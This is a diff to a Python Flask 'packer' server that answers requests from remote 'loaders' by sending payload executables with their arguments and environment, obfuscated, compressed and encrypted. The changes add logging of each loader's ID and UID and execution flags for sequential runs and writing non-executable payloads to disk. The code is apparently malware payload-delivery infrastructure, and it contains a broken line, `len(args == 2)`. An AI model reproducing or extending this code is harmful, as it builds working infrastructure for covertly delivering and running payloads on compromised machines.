@@ -46,8 +46,21 @@ import nacl.secret, nacl.utils
 import numpy as np
 import config_with_yaml as config
 import sys, getopt
+import logging
+from logging.handlers import RotatingFileHandler
 
 from flask.helpers import send_file
+
+my_handler = RotatingFileHandler('./logs/packer.log', mode='a', maxBytes=5*1024*1024, 
+                                 backupCount=2, encoding=None, delay=0)
+log_formatter = logging.Formatter('%(asctime)s | %(levelname)s | %(message)s')
+my_handler.setFormatter(log_formatter)
+my_handler.setLevel(logging.INFO)
+
+app_log = logging.getLogger('root')
+app_log.setLevel(logging.INFO)
+
+app_log.addHandler(my_handler)
 
 '''
 Generating keys via args
@@ -127,16 +140,19 @@ def dataroute():
     data_field = request.get_data(cache=False, as_text=True)
     
     args = data_field.split(' ')
-    if len(args) == 0 or len(args) > 2:
+    if len(args) == 0 or len(args) > 3:
         return ('', 204)
     if len(args) == 1:
         args.append('')
-    return packer(args[0], args[1])
+        args.append('')
+    if len(args == 2):
+        args.append('')
+    return packer(args[0], args[1], args[2])
 
 #This is the api used when the loader 
 @app.route('/api/<id>', methods=['GET'])
 def apiroute(id):
-    return packer(id, '')
+    return packer(id, '', '')
 
 @app.route('/cli/<arg>')
     #make sure that only local computer can access this admin panel
@@ -174,10 +190,6 @@ def cli(arg):
         return jsonify(next(os.walk('static/'))[1])
     elif arg == "online":
         return ("To be implemented")
-    elif arg == "details":
-        if loader_id in available_loaders:
-            return send_file('static/' + loader_id + "/details.txt")
-        return ("ID Not Found", 404)
     elif arg == "payloads":
         if loader_id in available_loaders:
             return (jsonify(available_payloads))
@@ -194,7 +206,7 @@ def cli(arg):
     return ("Invalid Argument", 400)
 
 
-def packer(id, query):
+def packer(id, query, uid):
     #todo: authenticate this api access with use of secret key
 
     #the reason why we have an authorized-ids.txt is that we may want to
@@ -216,9 +228,21 @@ def packer(id, query):
     
     send_arg = request.args.get('send', '')
     if send_arg == '':
-        send_arg = query
+        if query != '':
+            send_arg = query
+        else:
+            send_arg = "NO QUERY"
+    
+    uid_arg = request.args.get('uid', '')
+    if uid_arg == '':
+        if uid != '':
+            uid_arg = uid
+        else:
+            uid_arg = "NO UID"
 
-    #choose a payload or get available payloads
+    app_log.info(f'{id} | {send_arg} | {uid_arg}')
+
+    #choose a payload 
     if send_arg in available_payloads and send_arg != '':
         try:
             #encryption with PyNacl
@@ -234,6 +258,7 @@ def packer(id, query):
 
             argv_files = []
             envp_files = []
+            flag_files = []
             payload_files = []
             for (root, _, filenames) in os.walk('static/' + id + '/' + send_arg):
                 for filename in filenames:
@@ -242,6 +267,8 @@ def packer(id, query):
                         argv_files.append(path)
                     elif filename.endswith(".envp"):
                         envp_files.append(path)
+                    elif filename.endswith(".flags"):
+                        flag_files.append(path)
                     else:
                         payload_files.append(path)
             payload_files.sort()
@@ -257,6 +284,8 @@ def packer(id, query):
                 
                 argv = []
                 envp = []
+                flags = []
+                flagsum = 0
                 try:
                     argv.append(exe_name.encode("utf-8"))
                     argv += open(payload_name + ".argv", 'rb').read().splitlines()
@@ -264,6 +293,12 @@ def packer(id, query):
                     pass
                 try:
                     envp = open(payload_name + ".envp", 'rb').read().splitlines()
+                except:
+                    pass
+                try:
+                    flags = open(payload_name + ".flags", 'r').read().splitlines()
+                    for flag in flags:
+                        flagsum += int(flag)
                 except:
                     pass
                 
@@ -285,12 +320,13 @@ def packer(id, query):
 
                 filemeta = bytearray(b'')
                 #in order to make a 4byte int
-                meta = np.empty((5,), dtype=np.int32)
-                meta[0] = len(obfv_argv)
-                meta[1] = len(obfv_envp)
-                meta[2] = len(current_file)
-                meta[3] = len(compressed_file)
-                meta[4] = len(encrypted_file)
+                meta = np.empty((6,), dtype=np.int32)
+                meta[0] = flagsum
+                meta[1] = len(obfv_argv)
+                meta[2] = len(obfv_envp)
+                meta[3] = len(current_file)
+                meta[4] = len(compressed_file)
+                meta[5] = len(encrypted_file)
 
                 filemeta.extend(bytes(meta))
 
@@ -318,6 +354,7 @@ def packer(id, query):
             '''
             First 4 bytes, count of blobs
             Blob meta (as many as there are blobs) -
+                4 byte  - (8 boolean flags)
                 4 bytes - number of argv
                 4 bytes - number of envp
                 4 bytes - original size
@@ -333,6 +370,12 @@ def packer(id, query):
                 Raw bytes
             '''
 
+            '''
+            Possible boolean flags (1 is set, default is 0)
+            0x1 - Hold execution of next execution til this one finishes (default is parallel execution)
+            0x2 - Write to disk if non exe, (default is no)
+            '''
+
             finalblob.extend(bytes(count))
             for fm in filemetas:
                 finalblob.extend(fm)
@@ -342,8 +385,6 @@ def packer(id, query):
             return send_file(io.BytesIO(finalblob), as_attachment=True, attachment_filename="AWAY")
         except Exception as e:
             return str(e)
-    else:
-        return jsonify(available_payloads)
 
 if __name__ == "__main__":
     #todo change adhoc
